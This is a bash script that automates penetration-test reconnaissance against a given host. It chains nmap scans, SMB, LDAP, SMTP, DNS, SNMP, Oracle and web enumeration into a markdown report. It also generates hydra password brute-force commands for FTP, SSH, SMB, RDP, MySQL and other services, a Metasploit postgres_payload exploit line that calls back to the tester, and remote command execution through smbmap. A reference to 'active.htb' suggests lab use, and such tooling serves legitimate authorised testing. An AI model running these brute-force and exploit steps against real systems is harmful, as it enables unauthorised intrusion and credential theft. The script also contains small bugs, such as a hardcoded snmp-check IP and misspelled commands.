# Env Setup
  dir=`pwd`
  date=`date +%d-%m-%y`
  mdfile="hostscans.md"
  target=$(echo $1 | cut -d "/" -f 3)
  userlist=~/Tools/SecLists/Usernames/top-usernames-shortlist.txt
  passlist=~/Tools/SecLists/Passwords/darkweb2017-top100.txt
  line="\n=====================\n"
  mkdir -p $target
  cd $target
  mkdir nmap-basic
  mkdir nmap-udp

# Report generation
  echo "\n# Scan report for $target" |tee -a report-$target.md
  echo "------------------------------------------------------" | tee -a report-$target.md

# Discover services
  echo "\n## Nmap Scan for $target ...\n" | tee -a report-$target.md
  ports=$(nmap -Pn -p- --min-rate=1000 --open -T4 $target | grep "^[0-9]" | cut -d '/' -f 1 | tr  '\n' ',' | sed s/,$//)
  echo "\n### Open Ports:\n";for i in $(echo $ports | sed 's/,/\n/g'); do echo $target:$i; done | tee -a ports-$target.txt
  echo "\n"
  nmap -Pn -sC -sV -p $ports $target -oN nmap-basic/$target
  cat nmap-basic/* >> report-$target.md

# nmap udp scan
  echo "\n## Nmap UDP ...\n" | tee -a report-$target.md
  sudo nmap -sUVC --open $target --top-ports 200 -oN nmap-udp/$target
  cat nmap-udp/* >> report-$target.md

# get services
  cd nmap-basic/
  grep -Hari "/tcp" | grep -v ":|" >> ../services-$target.txt
  cd ../
  cd nmap-udp/
  grep -Hari "/udp" | grep -v filtered >> ../services-$target.txt
  cd ../
  echo "\n## Services ...\n" | tee -a report-$target.md
  cat services-$target.txt | tee -a report-$target.md
  echo "\n## Ports ...\n" | tee -a report-$target.md
  cat ports-$target.txt | tee -a report-$target.md
  mv nmap-basic/$target nmap-tcp-$target.txt
  mv nmap-udp/$target nmap-udp-$target.txt
  /bin/rm -rf nmap-udp
  /bin/rm -rf nmap-basic

# Specific Service Scans
############################################

# ftp scans
  if grep -qE "ftp" "services-$target.txt"; then
  echo "\n## FTP Services Found:\n" | tee -a report-$target.md
  echo "- [ ] Grab FTP Banner via telnet  telnet -n $target 21" | tee -a report-$target.md
  echo "- [ ] Grab FTP Certificate if existing  openssl s_client -connect $target:21 -starttls ftp" | tee -a report-$target.md
  echo "- [ ] Anon login and bounce FTP checks are performed  nmap --script ftp-* -p 21 $target" | tee -a report-$target.md
  echo "- [ ] Connect with Browser  #ftp://anonymous:anonymous@$target" | tee -a report-$target.md
  echo "- [ ] Need Username hydra -t 1 -l {Username} -P {Big_Passwordlist} -vV $target ftp" | tee -a report-$target.md
  echo "- [ ] Try dir traversal" >> report-$target.md
  nmap -Pn -p 21 --script=ftp-anon.nse,ftp-bounce.nse,ftp-libopie.nse,ftp-proftpd-backdoor.nse,ftp-syst.nse,ftp-vsftpd-backdoor.nse,ftp-vuln-cve2010-4221.nse $target | tee -a report-$target.md
  echo "hydra -L $userlist -P $passlist -e nsr -s 21 -o ftp-brute-$target.txt ftp://$target" | tee -a report-$target.md >> commands-$target.sh
  fi

# ssh scans
  if grep -qE ":22/tcp" "services-$target.txt"; then
  echo "\n## SSH Services Found:\n" | tee -a report-$target.md
  nmap -Pn -p 22 --script=ssh2-enum-algos,sshv1,ssh-hostkey $target | tee -a report-$target.md
  echo "hydra -L $userlist -P $passlist -e nsr -t 4 -s 22 -o ssh-brute-$target.txt ssh://$target" | tee -a report-$target.md >> commands-$target.sh
  fi

# telnet scans
  if grep -qE ":23/tcp" "services-$target.txt"; then
  echo "\n## Telnet Services Found:\n" | tee -a report-$target.md
  nmap -n -sV -Pn --script '*telnet*' -p 23 $target | tee -a report-$target.md
  echo "hydra -L $userlist -P $passlist -e nsr -s 23 -o telnet-brute-$target.txt telnet://$target" | tee -a report-$target.md >> commands-$target.sh
  fi

# imap
  if grep -qE ":143/tcp" "services-$target.txt"; then
  echo "\n## Imap Services Found:\n" | tee -a report-$target.md
  echo "- [ ] Banner Grab 143 nc -nv $target 143" | tee -a report-$target.md
  echo "- [ ] Banner Grab 993 openssl s_client -connect $target:993 -quiet" | tee -a report-$target.md
  fi

# pop3
  if grep -qE ":110/tcp" "services-$target.txt"; then
  echo "\n## POP Services Found:\n" | tee -a report-$target.md
  echo "- [ ] Banner Grab 110 nc -nv $target 110" | tee -a report-$target.md
  echo "- [ ] Grab Banner Secure  openssl s_client -connect $target:995 -crlf -quiet" | tee -a report-$target.md
  echo "- [ ] Scan for POP info nmap --script 'pop3-capabilities or pop3-ntlm-info' -sV -p 110 $target" | tee -a report-$target.md
  echo "- [ ] Need User hydra -l {Username} -P {Big_Passwordlist} -f $target pop3 -V" | tee -a report-$target.md
  echo "hydra -L $userlist -P $passlist -e nsr -s 110 -o pop3-brute-$target.txt pop3://$target" | tee -a report-$target.md >> commands-$target.sh
  fi

# SMB Scans
  if grep -qE ":445/tcp|:139/tcp|:111/tcp" "services-$target.txt"; then
  echo "\n## SMB Services Found:\n" | tee -a report-$target.md
  echo "hydra -l Administrator -P $passlist -e nsr -s 445 -o smb-admin-brute-$target.txt smb://$target" | tee -a report-$target.md >> commands-$target.sh
  echo "\n### NBTscan:\n" | tee -a report-$target.md
  nbtscan $target | tee -a report-$target.md
  echo "\n### Showmount:\n" | tee -a report-$target.md
  showmount -e $target 2>&1 | tee -a report-$target.md
  echo "\n### Enum4Linux:\n" | tee -a report-$target.md
  enum4linux -a -M -l -d $target 2>&1 | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" | tee -a report-$target.md
  echo "\n### RPCClient:\n" | tee -a report-$target.md
  rpcclient -p 111 -U "" $target | tee -a report-$target.md
  rpcclient -p 135 -U "" $target | tee -a report-$target.md
  rpcclient -p 2103 -U "" $target | tee -a report-$target.md
  rpcclient -p 2105 -U "" $target | tee -a report-$target.md
  echo "\n### Smbclient:\n" | tee -a report-$target.md
  smbclient -L\\ -N -I $target 2>&1 | tee -a report-$target.md
  echo "\n### SMBmap:\n" | tee -a report-$target.md
  smbmap -H $target -P 139 2>&1 | sed "s/\^M//" | grep -v "Working" |tee -a report-$target.md
  smbmap -H $target -P 139 -R 2>&1 | sed "s/\^M//" | grep -v "Working" |tee -a report-$target.md
  smbmap -H $target -P 445 2>&1 |sed "s/\^M//" | grep -v "Working" |tee -a report-$target.md
  smbmap -H $target -P 445 -R 2>&1 |sed "s/\^M//"  | grep -v "Working" |tee -a report-$target.md
  smbmap -H $target -P 139 -x "ipconfig /all" 2>&1 | grep -v "Working" |sed "s/\^M//" | tee -a report-$target.md
  echo "\n### MS17-Scan:\n" | tee -a report-$target.md
  msfconsole -qx "color false;use auxiliary/scanner/smb/smb_ms17_010; set rhosts $target;run" tee -a report-$target.md
  echo "\n### Nmap SMB Vuln Scan:\n" | tee -a report-$target.md
  sudo nmap -Pn -p 135,139,445 -sSV --script=smb-vuln*,smb-enum* $target | tee -a report-$target.md
  fi

# ldap scans
  if grep -qE ":389/tcp|:636/tcp" "services-$target.txt"; then
  echo "\n## LDAP Services found:\n" | tee -a report-$target.md
  echo "- [ ] Grab LDAP Banner  nmap -p 389 --script ldap-search -Pn $target" | tee -a report-$target.md
  echo "- [ ] Base LdapSearch ldapsearch -h $target -x" | tee -a report-$target.md
  echo "- [ ] Attempt to get LDAP Naming Context  ldapsearch -h $target -x -s base namingcontexts" | tee -a report-$target.md
  echo "- [ ] Need Naming Context to do big dump  ldapsearch -h $target -x -b '{Naming_Context}'" | tee -a report-$target.md
  echo "- [ ] Need User hydra -l {Username} -P {Big_Passwordlist} $target ldap2 -V -f" | tee -a report-$target.md
  ldapsearch -LLL -x -H ldap://$target -b '' -s base '(objectclass=*)' | tee -a report-$target.md
  fi

# smtp
  if grep -qE ":25/tcp" "services-$target.txt"; then
  echo "\n## SMTP Services found...\n" | tee -a report-$target.md
  echo "- [ ] Grab SMTP Banner  nc -vn $target 25" | tee -a report-$target.md
  echo "- [ ] SMTP Vuln Scan With Nmap  nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 $target" | tee -a report-$target.md
  echo "- [ ] Enumerate uses with smtp-user-enum  smtp-user-enum -M VRFY -U {Big_Userlist} -t $target" | tee -a report-$target.md
  echo "- [ ] Attempt to connect to SMTPS two different ways  openssl s_client -crlf -connect $target:465 &&&& openssl s_client -starttls smtp -crlf -connect $target:587" | tee -a report-$target.md
  echo "- [ ] Find MX servers of an organization  dig +short mx {Domain_Name}" | tee -a report-$target.md
  echo "- [ ] Need Nothing  hydra -P {Big_Passwordlist} $target smtp -V" | tee -a report-$target.md
  smtp-user-enum -M VRFY -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -t $target -p 25 2>&1 | tee -a report-$target.md
  sudo nmap -Pn -p 25 -sSV --script=smtp-commands.nse,smtp-enum-users.nse,smtp-ntlm-info.nse,smtp-open-relay.nse,smtp-strangeport.nse,smtp-vuln-cve2010-4344.nse,smtp-vuln-cve2011-1720.nse,smtp-vuln-cve2011-1764.nse $target | tee -a report-$target.md
  echo "hydra -L $userlist -P $passlist -e nsr -s 25 -o smtp-brute-$target.txt smtp://$target" | tee -a report-$target.md>> commands-$target.sh
  fi

# dns scans
  if grep -qE ":53/tcp|:53/udp" "services-$target.txt"; then
  echo "\n## DNS Services Found:\n" | tee -a report-$target.txt
  echo "- [ ] Grab DNS Banner dig version.bind CHAOS TXT @DNS" | tee -a report-$target.md
  echo "- [ ] Scan for Vulnerabilities with Nmap  nmap -n --script '(default and *dns*) or fcrdns or dns-srv-enum or dns-random-txid or dns-random-srcport' $target" | tee -a report-$target.md
  echo "- [ ] Three attempts at forcing a zone transfer dig axfr @$target && dix axfr @$target {Domain_Name} && fierce -dns {Domain_Name}" | tee -a report-$target.md
  echo "- [ ] Eunuerate a DC via DNS  dig -t _gc._{Domain_Name} && dig -t _ldap._{Domain_Name} && dig -t _kerberos._{Domain_Name} && dig -t _kpasswd._{Domain_Name} && nmap --script dns-srv-enum --script-args 'dns-srv-enum.domain={Domain_Name}'" | tee -a report-$target.md
  sudo nmap -Pn -sSV -p 53 --script=dns* $target | tee -a dns-$target.txt
  sudo nmap -Pn -sU -p 53 --script=dns* $target | tee -a dns-$target.txt
  echo "### Zone Transfer:" | tee -a dns-$target.txt
  dig +short ns $target | tee -a dns-$target.txt
  cat dns-$target.txt >> report-$target.md
  fi

# DC scans
  if grep -qE "88/tcp" "services-$target.txt"; then
  echo "\n## Domain Controller Found:\n" | tee -a report-$target.txt
  echo "- [ ] Brute Force to get Usernames  nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='{Domain_Name}',userdb={Big_Userlist} $target" | tee -a report-$target.md
  echo "- [ ] Brute Force with Usernames and Passwords  #consider git clonehttps://github.com/ropnop/kerbrute.git ./kerbrute -h" | tee -a report-$target.md
  echo "- [ ] Attempt to get a list of user service principal names GetUserSPNs.py -request -dc-ip $target active.htb/svc_tgs" | tee -a report-$target.md
  echo "hydra -L $userlist -P $passlist -e nsr -s 3389 -o rdp-brute-$target.txt rdp://$target" | tee -a report-$target.md >> commands-$target.sh
  fi

# mysql scans
  if grep -qE ":3306/tcp" "services-$target.txt"; then
  echo "\n## MySQL Services Found:\n" | tee -a report-$target.md
  echo "- [ ] Nmap with MySql Scripts nmap --script=mysql-databases.nse,mysql-empty-password.nse,mysql-enum.nse,mysql-info.nse,mysql-variables.nse,mysql-vuln-cve2012-2122.nse $target -p 3306" | tee -a report-$target.md
  echo "- [ ] Attempt to connect to mysql server  mysql -h $target -u {Username}@localhost" | tee -a report-$target.md
  echo "msfconsole -qx \"use auxiliary/scanner/mysql/mysql_login; set RHOSTS $target; set USERNAME root ;set PASS_FILE ~/Tools/SecLists/Passwords/darkweb2017-top100.txt; set USER_AS_PASS true; set BLANK_PASSWORDS true; set VERBOSE false ;run\" | tee -a loginbrute.txt" | tee -a report-$target.md
  echo "mysql -h $target -u root -p " | tee -a report-$target.md
  echo "hydra -L $userlist -P $passlist -e nsr -s 3306 -o mysql-brute-$target.txt mysql://$target" | tee -a report-$target.md >> commands-$target.sh
  fi

# MSSQL scans
  if grep -qE "1433/tcp" "services-$target.txt"; then
  echo "\n## MSSQL Services Found:\n" | tee -a report-$target.md
  nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $target | tee -a report-$target.md
  fi

# rdp scans
  if grep -qE "3389/tcp" "services-$target.txt"; then
  echo "\n## RDP Services Found:\n" | tee -a report-$target.md
  echo "- [ ] Check for bluekeep" | tee -a report-$target.md
  nmap --script 'rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info' -p 3389 -T4 $target | tee -a report-$target.md
  echo "hydra -L $userlist -P $passlist -e nsr -s 3389 -o rdp-brute-$target.txt rdp://$target" | tee -a report-$target.md >> commands-$target.sh
  fi

# postgresql scans
  if grep -qE ":5432/tcp" "services-$target.txt"; then
  echo "\n## PostGRESql Services Found:\n" | tee -a report-$target.md
  echo "msfconsole -qx \"use exploit/linux/postgres/postgres_payload; set rhosts $target; set lhost tun0; run\" | tee -a loginbrute.txt" | tee -a report-$target.md
  echo "hydra -L $userlist -P $passlist -e nsr -s 5432 -o postgres-brute-$target.txt postgres://$target" | tee -a report-$target.md >> commands-$target.sh
  fi

# vnc scans
  if grep -qE "vnc" "services-$target.txt"; then
  echo "\n## VNC Services Found:\n" | tee -a report-$target.md
  echo "- [ ] Test for weak creds" | tee -a report-$target.md
  nmap -Pn -p 5800,5900 --script=realvnc-auth-bypass.nse,vnc-info.nse,vnc-title.nse $target | tee -a report-$target.md
  echo "hydra -P $passlist -e nsr -s 5900 -o vnc-brute-$target.txt vnc://$target" | tee -a report-$target.md | tee -a commands-$target.sh
  fi

# Oracle scans
  if grep -qE "oracle" "services-$target.txt"; then
  echo "\n## Oracle Services Found:\n" | tee -a oracle-$target.txt
  echo "- [ ] Run all odat commands" | tee -a report-$target.md
  nmap -Pn --script=oracle-sid-brute -p 1521-1560 $target | tee -a oracle-$target.txt
  echo "nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=oracl $target" | tee -a oracle-$target.txt
  nmap -Pn -p 1521 --open $1 --script=oracle-sid-brute.nse | tee -a oracle-$1.txt
  dir=`pwd`
  cd ~/Tools/odat/
  python3 odat.py sidguesser -s $1 | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" | tee -a $dir/oracle-$1.txt
  echo "Bruteforcing passwords... please wait..."
  cat  $dir/oracle-$target.txt | grep "is a valid " | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" | cut -d "'" -f 2 | sort -u | grep -vE "^$" > $dir/oraclesid.txt
  for i in $(cat $dir/oraclesid.txt)
  do
  echo "python3 odat.py passwordguesser -d $i -s $target -p 1521 --accounts-file accounts/accounts_multiple.txt |tee -a $dir/oracle-$1.txt" >> oracle-$1.txt
  echo "python3 odat.py all -d $i -s $target -p 1521" >> $dir/oracle-$target.txt
  done
  cd $dir
  cat oracle-$target.txt >> report-$target.md
  fi

# snmp scans
  if grep -qE ":161/udp" "services-$target.txt"; then
  echo "\n## SNMP Services Found:\n" | tee -a report-$target.md
  echo "- [ ] Enumerate SNMP  snmp-check $target" | tee -a report-$target.md
  echo "- [ ] Crack SNMP passwords  onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt $target -w 100" | tee -a report-$target.md
  echo "- [ ] Nmap snmp (no brute)  nmap --script 'snmp* and not snmp-brute' $target" | tee -a report-$target.md
  echo "- [ ] Need Nothing  hydra -P {Big_Passwordlist} -v $target snmp" | tee -a report-$target.md
  # Nmap Recon
  sudo nmap -Pn -sUV -p 161 --script=snmp-hh3c-logins.nse,snmp-info.nse,snmp-interfaces.nse,snmp-ios-config.nse,snmp-netstat.nse,snmp-processes.nse,snmp-sysdescr.nse,snmp-win32-services.nse,snmp-win32-shares.nse,snmp-win32-software.nse,snmp-win32-users.nse $target -oN nmap-snmp-$target.txt | tee -a report-$target.md
  # snmp check
  snmp-check 192.168.56.103 | tee -a $snmp-check-$target.txt | tee -a report-$target.md
  #snmpwalk
  snmpwalk -v 1 -c public $target | tee -a snmp-walk-$target.txt | tee -a report-$target.md
  #snmpcheck
  fi


# http services Discovery
  echo "\n## Webservers Found:\n" | tee -a report-$target.md
  echo "- [ ] Nikto and GoBuster  nikto -host {Web_Proto}://$target:{Web_Port} &&&& gobuster dir -w {Small_Dirlist} -u {Web_Proto}://$target:{Web_Port} && gobuster dir -w {Big_Dirlist} -u {Web_Proto}://$target:{Web_Port}" | tee -a report-$target.md
  echo "- [ ] Basic Site Info via Nikto nikto -host {Web_Proto}://$target:{Web_Port}" | tee -a report-$target.md
  echo "- [ ] General purpose auto scanner  whatweb -a 4 $target" | tee -a report-$target.md
  echo "- [ ] Non-Recursive Directory Brute Force gobuster dir -w {Big_Dirlist} -u {Web_Proto}://$target:{Web_Port}" | tee -a report-$target.md
  echo "- [ ] Recursive Directory Brute Force python3 {Tool_Dir}dirsearch/dirsearch.py -w {Small_Dirlist} -e php,exe,sh,py,html,pl -f -t 20 -u {Web_Proto}://$target:{Web_Port} -r 10" | tee -a report-$target.md
  echo "- [ ] Common Gateway Interface Brute Force  gobuster dir -u {Web_Proto}://$target:{Web_Port}/ -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt -s 200" | tee -a report-$target.md
  echo "- [ ] Tailored Nmap Scan for Vulnerabilities  nmap -vv --reason -Pn -sV -p {Web_Port} --script=`banner,(http* or ssl*) and not (brute or broadcast or dos or external or http-slowloris* or fuzzer)` $target" | tee -a report-$target.md
  echo "- [ ] Drupal Enumeration Notes  git clone https://github.com/immunIT/drupwn.git for low hanging fruit and git clone https://github.com/droope/droopescan.git for deeper enumeration" | tee -a report-$target.md
  echo "- [ ] WordPress Enumeration with WPScan What is the location of the wp-login.php? Example: /Yeet/cannon/wp-login.php" | tee -a report-$target.md
  echo "- [ ] wpscan --url {Web_Proto}://$target{1} --enumerate ap,at,cb,dbe && wpscan --url {Web_Proto}://$target{1} --enumerate u,tt,t,vp --passwords {Big_Passwordlist} -e" | tee -a report-$target.md
  echo "- [ ] Need User (admin is default)  hydra -l admin -P {Big_Passwordlist} $target -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'" | tee -a report-$target.md
  echo $target | httprobe | tee -a webservers-$target.txt
  cat ports-$target.txt |grep -vE ":80$|:443$" | httprobe | tee -a webservers-$target.txt

# HTTP Service scans
  if grep -qE "http" "webservers-$target.txt"; then
  cat webservers-$target.txt >> report-$target.md

  echo "\n### All Headers ...\n" | tee -a report-$target.md
  for i in $(cat webservers-$target.txt)
  do
  echo "$i\n----" | tee -a http-headers-$target.txt
  curl -sk -sSL -D - $i -o /dev/null | tee -a http-headers-$target.txt
  done
  cat http-headers-$target.txt >> report-$target.md

  # whatweb
  echo "\n### Whatweb:\n" | tee -a report-$target.md
  for i in $(cat webservers-$target.txt)
  do
  whatweb $i --color never | tee -a whatweb-$target.txt
  echo "\n" | tee -a whatweb-$target.txt
  done
  cat whatweb-$target.txt >> report-$target.md

  # spider
  echo "\n### Spider:\n" | tee -a report-$target.md
  for i in $(cat webservers-$target.txt)
  do
  echo $i | tee -a gospider-$target.txt
  #gospider -d 3 -s $i | tee -a gospider-$target.txt
  echo $i | hakrawler -d 3 | grep $i | sort -u | tee -a gospider-$target.txt
  done
  cat gospider-$target.txt | tee -a report-$target.md

  # directory bruteforce
  for i in $(cat webservers-$target.txt)
  do
  echo "gobuster dir -b 301,302,303,400,404,401,403 -k -u $i -w  /usr/share/seclists/Discovery/Web-Content/common.txt -q -e -o gobuster-directories-$(echo $i | cut -d '/' -f 3)-$target.txt" >> commands-$target.sh
  echo "feroxbuster -u $i -t 10 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x \"txt,html,php,asp,aspx,jsp\" -v -k -n -C 401,403,404 -r -q -o feroxbuster-directories-$(echo $i | cut -d '/' -f 3)-$target.txt" >> commands-$target.sh
  done

  # nikto
  for i in $(cat webservers-$target.txt)
  do
  echo "nikto -h $i -ask no  --maxtime 5m | tee -a nikto-$target.txt" >> commands-$target.sh
  done

  # nuclei
  echo "\n### Nuclei:\n" | tee -a report-$target.md
  nuclei -l webservers-$target.txt --system-resolvers -nc -silent | cut -f 3- -d " " | grep -v "http-missing-security-headers" | sort -h | tee -a nuclei-$target.txt
  cat nuclei-$target.txt >> report-$target.md
fi

# Command Generation
echo "\n### Further Commands to Run:\n" | tee -a report-$target.md
cat commands-$target.sh | sort -u -o commands-$target.sh
cat commands-$target.sh | grep -v hydra >> commands.tmp
cat commands-$target.sh | grep hydra >> commands.tmp
cat commands.tmp > commands-$target.sh
/bin/rm commands.tmp
chmod +x commands-$target.sh
cat commands-$target.sh | tee -a report-$target.md

cat report-$target.md | sed 's/\r//g' > report-$target.tmp
mv report-$target.tmp report-$target.md
echo "# $target Scans Complete, review report..........."
#vim report-$target.md
echo "# Scan report for $target\n\`\`\`" >> $mdfile
cat report-$target.md >> $mdfile
echo "\`\`\`" >> $mdfile
